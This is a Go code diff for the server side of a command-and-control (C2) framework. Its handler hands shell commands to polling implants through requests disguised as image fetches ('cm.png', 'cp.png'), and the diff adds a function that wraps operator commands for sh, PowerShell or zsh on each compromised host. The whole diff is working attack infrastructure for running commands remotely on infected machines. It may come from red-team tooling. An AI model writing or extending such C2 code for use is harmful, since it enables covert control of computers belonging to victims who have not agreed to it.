@@ -2,6 +2,7 @@ package main
 
 import (
 	"encoding/json"
+	"errors"
 	"github.com/labstack/echo/v4"
 	"io/ioutil"
 	"libs"
@@ -139,13 +140,7 @@ func handleC2Cmd(c echo.Context) error {
 	switch {
 	case imageName == "cm.png": // commands
 		utils.PrintDebug(debug, "Get default shell commands")
-		if _, err := os.Stat(cmd2file + "/sh"); err == nil {
-			shellcmd = "sh:-c:whoami"
-		} else if _, err = os.Stat(cmd2file + "/powershell"); err == nil {
-			shellcmd = "powershell:whoami"
-		} else if _, err = os.Stat(cmd2file + "/zsh"); err == nil {
-			shellcmd = "zsh:-c:whoami"
-		}
+		shellcmd = "whoami"
 		f, err = os.OpenFile(cmd2file+"/console.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
 		if err != nil {
 			utils.PrintDebug(debug, "Could not open file at: %s\n%v", cmd2file+"/console.log", err)
@@ -172,21 +167,30 @@ func handleC2Cmd(c echo.Context) error {
 
 		return nil
 	case imageName == "cp.png": // command polling
-		utils.PrintDebug(debug, "Checking for new commands")
+		utils.PrintDebug(debug, "%s - Checking for new commands", guid)
 		if _, err := os.Stat(cmd2file + "/command"); err == nil {
 			f, err := os.Open(cmd2file + "/command")
 			if err == nil {
 				defer f.Close()
 				defer os.Remove(cmd2file + "/command")
 				b, err := ioutil.ReadAll(f)
+				if err != nil {
+					utils.PrintDebug(debug, "Error reading command from file \n%v", err)
+					return c.String(http.StatusNotModified, "")
+				}
+				cmd, err := generateC2Command(b, guid)
+				if err != nil {
+					utils.PrintDebug(debug, "Error generating c2cmd \n%v", err)
+					return c.String(http.StatusNotModified, "")
+				}
 				ff, err2 := os.OpenFile(cmd2file+"/console.log",
 					os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
 				if err2 == nil {
 					defer ff.Close()
-					f.WriteString("\n< " + string(b) + "\n")
+					ff.WriteString("\n> " + cmd + "\n")
 				}
 				if err == nil {
-					return c.String(http.StatusOK, string(b))
+					return c.String(http.StatusOK, cmd)
 				}
 			}
 		}
@@ -195,4 +199,24 @@ func handleC2Cmd(c echo.Context) error {
 
 	os.Mkdir(folderPath, 0755)
 	return nil
+}
+
+func generateC2Command(body []byte, guid string) (string, error) {
+	var (
+		cmd      string
+		err      error
+		cmd2file string = c2cmdPath + "/" + guid
+	)
+	cmd = string(body)
+	// get the script interpreter for this host
+	if _, err = os.Stat(cmd2file + "/sh"); err == nil {
+		cmd = "sh:-c:" + cmd
+	} else if _, err = os.Stat(cmd2file + "/powershell"); err == nil {
+		cmd = "powershell:" + cmd
+	} else if _, err = os.Stat(cmd2file + "/zsh"); err == nil {
+		cmd = "zsh:-c:" + cmd
+	} else {
+		return "", errors.New("Not interpreter found for this host")
+	}
+	return cmd, nil
 }
